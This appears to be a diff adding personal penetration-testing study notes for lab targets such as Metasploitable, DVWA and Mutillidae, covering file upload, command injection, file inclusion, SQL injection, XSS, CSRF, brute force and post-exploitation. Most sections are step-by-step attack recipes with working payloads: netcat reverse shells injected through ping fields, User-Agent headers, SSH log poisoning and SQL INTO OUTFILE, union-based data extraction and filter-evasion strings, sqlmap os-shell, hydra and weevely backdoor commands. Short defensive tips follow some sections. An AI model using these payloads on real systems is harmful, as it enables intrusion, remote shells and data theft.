@@ -1,0 +1,412 @@
+Vulnerabilities
+===============
+1. File Upload
+2. Code Execution
+3. Page Inclusion
+
+Metasploitable Misconfiguration Solution
+========================================
+1. sudo nano /var/www/mutillidae/config.inc
+Change dbname into 'owasp10'
+
+DVWA Default Credentials
+========================
+username: admin
+password: password
+
+Weevely File Upload Exploitation
+================================
+1. > weevely generate [password] [filepath + filename]
+2. Upload it
+3. > weevely [link of file uploaded] [password]
+
+Access Gained :)
+
+Burp Proxy
+==========
+1. Kali linux open Burp suite
+2. Open default
+3. Browser network proxy to 127.0.0.1:8080
+4. Enjoy proxy :)
+
+--------------------------------------------------------------
+
+File Upload Vulnerabilities
+===========================
+1. Try to upload the executable file directly
+2. Change executable into jpg or acceptable format, and change its file extension with burp suite but keep the same content type
+3. Change the executable into something like filename.php.jpg
+
+File Upload Security
+====================
+1. Not allow users to upload executables
+2. Valdiate the file type AND the file extension
+3. Analyse the uploaded file itself, recreate it and rename it (E.g. php-Imagick)
+
+--------------------------------------------------------------
+
+Code Execution Vulnerabilities
+==============================
+1. Linux
+Accept ping ip addr: 192.168.0.2
+Add new command by: 192.168.0.2; pwd
+
+OR
+
+Run only second command by: 192.168.0.2 | pwd
+
+kali linux: nc -vv -l -p 8080
+Code inject: nc -e /bin/sh [kali linux host ip]  8080
+Get Hacked:)
+
+Code Execution Security
+=======================
+1. Filter use input (E.g. regex)
+
+--------------------------------------------------------------
+
+Local File Inclusion
+====================
+- ?page=include.php
+change into ?page=/../../../../../etc/password
+
+OR
+
+Burp Suite
+Include the file ?page=/../../../../../proc/self/environ
+Modify header "User-Agent" value with php code such as "<?php phpinfo() ?>"
+
+OR
+
+Burp Suite
+Include the file ?page=/../../../../../proc/self/environ
+kali linux > nc -vv -l -p 8888
+Modify header "User Agent" value with "passthru("nc -e /bin/sh [host ip] [port]");"
+
+OR
+
+Include the file ?page=/../../../../../var/log/auth.log 
+kali linux > ssh random@[server host ip]
+Check whether the login recorded or not
+kali linux > nc -vv -l -p 8888
+Get this code > ssh "<?php passthru('nc -e /bin/sh [host ip] [port]');?>"@[server host ip]
+Go to burp suite > decoder > paste the above code "nc -e /bin/sh [host ip] [port]" and encode as Base64 <<< double quote no need to copy
+Into ssh "<?php passthru(base64_decode('XXXXXX'));?>"@[server host ip]
+
+For Linux
+---------
+/etc/passwd <<< directory of password stored
+/proc/self/environ <<< environment variable
+/var/log/auth.log 
+/var/log/apache2/access.log 
+
+--------------------------------------------------------------
+
+Remote File Inclusion
+=====================
+Metasploitable settings to allow remote file
+> sudo nano /etc/php5/cgi/php.ini
+ctrl + w = search "allow_url" to On
+After edit
+> sudo /etc/init.d/apache2 restart
+
+First, reate a txt file and code of
+<?php passthru("nc -e /bin/sh [host ip] [port]") ?>
+and include the file ?page=http://[host ip]/[filepath + filename of the txt]?
+
+If failed
+
+try to modify http into hTTp see can or not
+
+File Inclusion Security
+=======================
+1. Prevent remove file inclusion
+> Disable allow_url_fopen & allow_url_include
+
+2. Prevent local file inclusion
+> Use static file inclusion
+
+E.g. index.php?page=news.php
+Code: include($_GET['page']);
+
+Change into
+
+include('page.php');
+
+OR
+
+Validate parameter like ($file != "include.php")
+
+--------------------------------------------------------------
+
+Login to metasploitable mysql
+mysql -u root -h [metasploitable host ip]
+> show databases;
+> use [database name]
+> show tables;
+> select * from [table name]
+
+SQL Injection - LOGIN (POST METHOD)
+=====================
+1. Use 'and', 'order by' or "'";
+2. password = 123456' and 1=1 #
+# is to comment text after that
+select * from accounts where username = 'username' and password = 'password' and 1=1 #' <<< login success
+select * from accounts where username = 'username' and password = 'password' and 1=2 #' <<< login failed
+^^^ This statement to test where sql injection is available ^^^
+Input Concept = password' CODE HERE #
+
+3. 
+Password input: whateverpassword' or 1=1 #
+select * from accounts where username = '$USERNAME' and password = 'password' or 1=1 #'
+
+OR
+
+Username input: admin' #
+select * from accounts where username = 'admin' #' and password = '$PASSWORD'
+^^^ Login without knowing the password
+
+OR
+
+Try to use BURP SUITE, use normal character for client side and modify in proxy
+
+SQL Injection - EXTRACT DATA (GET METHOD)
+============================
+1.?username=tester into ?username=tester' order by 1 #
+which is going to encoded url into
+?username=tester' order by 1 %23
+^^^ Get user data without correct password
+
+2. ?username=tester' order by [number of records to check in this statement, if exists will display error message] %23
+^^^ Check number of records
+
+3. ?username=tester' union select 1,2,3,4,5 %23
+into ?username=tester' union select 1,database(),user(),version(),5 %23
+^^^ Check more things, match with previous, 5 max then select until 5
+
+4. ?username=tester' union select 1,table_name,null,null,5 from information_schema.tables %23
+^^^ List every table for all database
+
+5. ?username=tester' union select 1,table_name,null,null,5 from information_schema.tables where table_schema = 'database name' %23
+^^^ List tables for particular database
+
+6. username=tester' union select 1,column_name,null,null,5 from information_schema.columns where table_name = 'table name' %23
+^^^ List all column for certain tables
+
+7. username=tester' union select 1,username,password,is_admin,5 from [table name] %23
+^^^ List all records for the table with columns
+
+1 and 5 remain is because you will only see the record between the range
+
+Blind SQL Injection - (Did not show output)
+===================
+1. [id]' and 1=1 <- True, [id]' and 1=2 <- false
+^^^ Check sql injection vulnerabilities exists
+
+2. Then inject like previous part
+
+3. Try modify ' 
+- into none
+- http encoded %27
+- use burp suite to hex encode the content inside '', therefore, can eliminate the need of ''
+E.g. encoded become 64767761, then write in url as 0x64767761
+
+4. If union select does not work well, try this
+?username tester' union select table_name,2 fRom_information_schema.tables limit 1,2 %23 <<< to list first table
+?username tester' union select table_name,2 fRom_information_schema.tables limit 2,3 %23 <<< to list second table
+For particular database
+?username tester' union select table_name,2 fRom_information_schema.tables where table_schema='[table name]' limit 1,2 %23
+
+5. Sometimes, try this
+and 1=1
+aNd 222=222
+anD 333=333
+orDeR bY 1
+
+6. Sometimes, union select 1,2 %23
+Try convert into
+uNioN+sEleCt+1,2+%23
+OR
+uNioN/**/sEleCt/**/1,2/**/%23
+
+7. Sometimes, comment can be
+/*
+--
+//
+; --
+; /*
+; //
+
+SQL Injection Read Write File
+=============================
+1. union select null, load_file('/etc/passwd'),null,null,null %23
+^^^ Read file
+2. union select null, 'example example(this is content)',null,null,null into outfile '/var/www/mutilidae/example.txt' %23
+If CANNOT, try to change into another path lile '/tmp'
+^^^ Write file
+
+SQL Injection Reverse Shell
+===========================
+1. union select '<?php passthru("nc -e /bin/sh 192.168.0.199 8080") ?>',null into outfile '/tmp/reverse.php'
+Access by ?page=../../../../../tmp/reverse.php
+
+OR store in writeable directory
+
+SQL Injection Tools - SQLMAP
+===================
+> sqlmap --help
+> sqlmap -u "[injection url with parameter]"
+> sqlmap -u "[injection url with parameter]" --dbs
+> sqlmap -u "[injection url with parameter]" --currrent-user
+> sqlmap -u "[injection url with parameter]" --currrent-db
+> sqlmap -u "[injection url with parameter]" --tables -D [database] <<< get tables
+> sqlmap -u "[injection url with parameter]" --columns -T [table name] -D [database] <<< get columns
+> sqlmap -u "[injection url with parameter]" -T [table] -D [database] --dump <<< get data
+> sqlmap -u "[injection url with parameter]" --os-shell <<< upload shell
+> sqlmap -u "[injection url with parameter]" --sql-shell <<< go into sql shell
+current_user()
+user()
+database()
+select [table] from information_schema.tables where table_schema = '[database]'
+> sqlmap -u "[injection url with parameter]" 
+> sqlmap -u "[injection url with parameter]" 
+> sqlmap -u "[injection url with parameter]" 
+
+SQL Injection Security
+======================
+1. escape real string (Filter input)
+2. use quote to read variable to input will read as string instead of command
+E.g. "select first_name from users where user_id = '$id'"
+3. Use bind param, do not direct inject
+E.g.
+$username = admin' union select #
+select * face accounts where username = '$username' <<< insecure
+Safe:
+->prepare("select * from accounts where username = ?")
+->execute(array("$username"))
+
+--------------------------------------------------------------
+
+XSS - Cross Site Scripting
+- inject javascript into the page
+- Execute when page loads
+- Execute on the client machine not the server
+
+Three main types:
+1. Persistent/Stored XSS
+2. Reflected XSS
+3. DOM based XSS
+
+XSS Vulnerabilities
+===================
+1. ReflectedXSS
+E.g. http://target.com/page.php?something=<script>alert("XSS")</script>
+Execute  on client machine only
+
+OR try
+
+<sCript></Script>
+
+OR
+
+" ; alert('xss'); // 
+
+OR
+
+
+<Script>alert(String.fromCharCode(108, 97, 108, 97))</sCript> <<< char code calculator
+
+2. Stored XSS
+Just put code inside input like comment box <<< You know how
+
+3. DOM Based XSS
+Not works in Firefox
+E.g. https://xss-doc.appspot.com/demo/3
+https://xss-doc.appspot.com/demo/3#1
+https://xss-doc.appspot.com/demo/3#whatever
+
+https://xss-doc.appspot.com/demo/3#whatever.jpg' onerror=alert("xss");>
+
+XSS Exploitation - Beef Framework
+================
+XSS script src to beef <<< But this inject to own host only = =|||
+Therefore, use in Stored XSS
+
+XSS Security
+============
+1. XSS Filter Evasion Cheat Sheet
+2. Filter input
+E.g. htmlspecialchars($_GET['name']);
+
+--------------------------------------------------------------
+
+Insecure Session Management
+===========================
+1. Cookies Manager+ - Firefox
+ALT > Tools > Cookies Manager+ > The Page > see any interesting cookies data and change it
+
+Solution: Use Token
+
+2. Cross Site Request Forgery - CSRF
+E.g. In change password page
+Copy the form html and modify the action to the same page
+Change all input into hidden and delete all label, set the form auto submit by javascript
+
+Solution: Need user current password
+
+--------------------------------------------------------------
+
+Brute Force & Dictionary Attacks
+================================
+1. create a wordlist
+> crunch [min] [max] [characters] -t [pattern] op [filename]
+> crunch 6 8 123abc -t a@@@@b -o wordlist
+
+2. Hydra - Bruteforce tool
+> hydra [ip] -L [username] -P [password] [service]
+> hydra 10.20.14.212 -l admin -P /root/wordlist.txt [service]
+Use burp suite to log the header of http request
+http-post-form /"mutillidae/index.php?page=login.php:username^USER&password=^PASS^&login-php-submit-button=Login:F=Not Logged In"
+> hydra -U [service] <<< list usage examples
+> -l <<< one username
+> -L <<< list of usernames
+
+CTRL + C pause, and next time use -r to continue
+
+Solution: Login Attempt, Failed X times -> locked
+
+--------------------------------------------------------------
+
+Discovering Vulnerabilities - Zed Attack Proxy Zap
+===========================
+1. Open Zap in kali linux
+2. Paste the website url and click scan
+3. View alerts and test it :)
+
+--------------------------------------------------------------
+
+Post Exploitation
+=================
+1. When gained reverse shell
+wget "[link of weevely shell]"
+mv xxx.txt into xxx.php
+Weevely visit and gain privileges :)
+
+Weevely Commands
+================
+> help
+> system_info -h <<< see options
+> audit_etcpasswd -h
+> audit_etcpasswd -vector [file|fread|and so on]
+> file_download -h
+> file_download -vector [VECTOR] [filename] -host [HOST] [location to store file]
+> file_uploadd -h
+> file_upload -vector [VECTOR] [filename] -host [HOST] [location to store file]
+> backdoor_reversetcp -h
+> backdoor_reversetcp -vector [VECTOR] [YOUR IP] [PORT]
+List file go to config see any useful information such as database login config.inc.php
+> sql_console -h
+> sql_dump -h
+> sql_dump -vector [VECTOR] -host [HOST] -lpath [location to store data] [dbname] [username] [password]
+
+Tip: Ignore -vector [VECTOR] at first, if cannot, then use -vector [VECTOR]
